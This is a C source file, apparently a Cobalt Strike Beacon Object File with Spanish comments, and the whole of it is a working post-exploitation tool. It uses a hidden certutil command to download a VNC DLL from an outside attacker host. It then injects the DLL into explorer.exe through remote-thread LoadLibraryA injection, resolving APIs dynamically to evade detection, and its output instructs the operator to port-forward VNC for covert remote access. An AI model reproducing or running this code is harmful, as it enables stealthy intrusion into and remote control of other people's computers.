#include <windows.h>
#include "beacon.h"

// ================================
// IMPORTS DIRECTOS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_CloseHandle;

// ================================
// DEFINICIONES MANUALES
// ================================
#define TH32CS_SNAPPROCESS 0x00000002

typedef struct _PROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[260];
} PROCESSENTRY32, *LPPROCESSENTRY32;

// ================================
// FUNCIÓN AUX: EJECUTAR COMANDO OCULTO
// ================================
void execute_cmd_hidden(char* cmd) {
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) return;

    typedef BOOL (WINAPI *CREATEPROCESSA)(
        LPCSTR, LPSTR, LPVOID, LPVOID, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (pCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        typedef DWORD (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
        WAITFORSINGLEOBJECT pWaitForSingleObject = (WAITFORSINGLEOBJECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WaitForSingleObject");
        if (pWaitForSingleObject) {
            pWaitForSingleObject(pi.hProcess, 8000);
        }

        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);
    }
}

// ================================
// FUNCIÓN PRINCIPAL
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[VNC] Iniciando descarga e inyección...");

    // === Paso 1: Obtener %TEMP% ===
    typedef DWORD (WINAPI *GETENVVARA)(LPCSTR, LPSTR, DWORD);
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    GETENVVARA pGetEnvVarA = (GETENVVARA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "GetEnvironmentVariableA");

    char temp_path[512] = {0};
    char dll_path[512] = {0};

    if (!pGetEnvVarA || !pGetEnvVarA("TEMP", temp_path, sizeof(temp_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo obtener %%TEMP%%");
        return;
    }

    // ✅ Reemplazo de snprintf → wsprintfA (NO CRT)
    // Cargar user32.dll y resolver wsprintfA dinámicamente
    HMODULE hUser32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("user32.dll");
    if (!hUser32) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo cargar user32.dll para wsprintfA");
        return;
    }

    typedef int (WINAPI *WSPRINTFA)(LPSTR, LPCSTR, ...);
    WSPRINTFA pwsprintfA = (WSPRINTFA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hUser32, "wsprintfA");
    if (!pwsprintfA) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo resolver wsprintfA");
        return;
    }

    pwsprintfA(dll_path, "%s\\winvnc.x64.dll", temp_path);

    // === Paso 2: Descargar DLL ===
    char cmd[1024];
    pwsprintfA(cmd, "certutil -urlcache -split -f http://10.10.14.91/winvnc.x64.dll \"%s\"", dll_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Descargando: %s", cmd);
    execute_cmd_hidden(cmd);

    // === Paso 3: Cargar Toolhelp32 dinámicamente ===
    typedef HANDLE (WINAPI *CREATE_SNAPSHOT)(DWORD, DWORD);
    typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);

    CREATE_SNAPSHOT pCreateToolhelp32Snapshot = (CREATE_SNAPSHOT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateToolhelp32Snapshot");
    PROCESS32FIRST pProcess32First = (PROCESS32FIRST)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Process32First");
    PROCESS32NEXT pProcess32Next = (PROCESS32NEXT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Process32Next");

    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudieron resolver funciones de Toolhelp32");
        return;
    }

    // === Paso 4: Buscar explorer.exe ===
    HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Snapshot fallido");
        return;
    }

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    DWORD target_pid = 0;

    if (pProcess32First(hSnapshot, &pe)) {
        do {
            if (pe.szExeFile[0] == 'e' && pe.szExeFile[1] == 'x' && pe.szExeFile[2] == 'p' &&
                pe.szExeFile[3] == 'l' && pe.szExeFile[4] == 'o' && pe.szExeFile[5] == 'r' &&
                pe.szExeFile[6] == 'e' && pe.szExeFile[7] == 'r' && pe.szExeFile[8] == '.' &&
                pe.szExeFile[9] == 'e' && pe.szExeFile[10] == 'x' && pe.szExeFile[11] == 'e' &&
                pe.szExeFile[12] == '\0') {

                target_pid = pe.th32ProcessID;
                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Encontrado explorer.exe PID: %d", target_pid);
                break;
            }
        } while (pProcess32Next(hSnapshot, &pe));
    }

    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hSnapshot);

    if (target_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se encontró explorer.exe");
        return;
    }

    // === Paso 5: Abrir proceso ===
    typedef HANDLE (WINAPI *OPENPROCESS)(DWORD, BOOL, DWORD);
    OPENPROCESS pOpenProcess = (OPENPROCESS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "OpenProcess");
    if (!pOpenProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] OpenProcess no disponible");
        return;
    }

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo abrir el proceso");
        return;
    }

    // === Paso 6: Reservar memoria para la ruta ===
    typedef LPVOID (WINAPI *VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    VIRTUALALLOCEX pVirtualAllocEx = (VIRTUALALLOCEX)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "VirtualAllocEx");

    LPVOID pRemoteMem = pVirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] VirtualAllocEx falló");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    // === Paso 7: Escribir ruta ===
    typedef BOOL (WINAPI *WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WRITEPROCESSMEMORY pWriteProcessMemory = (WRITEPROCESSMEMORY)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WriteProcessMemory");

    SIZE_T written;
    if (!pWriteProcessMemory(hProcess, pRemoteMem, dll_path, strlen(dll_path) + 1, &written)) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] WriteProcessMemory falló");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    // === Paso 8: Inyectar LoadLibraryA ===
    typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;

    typedef HANDLE (WINAPI *CREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CREATEREMOTETHREAD pCreateRemoteThread = (CREATEREMOTETHREAD)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateRemoteThread");

    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMem, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] CreateRemoteThread falló");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] ¡DLL inyectada en explorer.exe!");
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hThread);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecuta en Beacon:");
    BeaconPrintf(CALLBACK_OUTPUT, "    portfwd add 5900 127.0.0.1 5900");
    BeaconPrintf(CALLBACK_OUTPUT, "    Y conéctate con VNC Viewer a 127.0.0.1:5900");
}
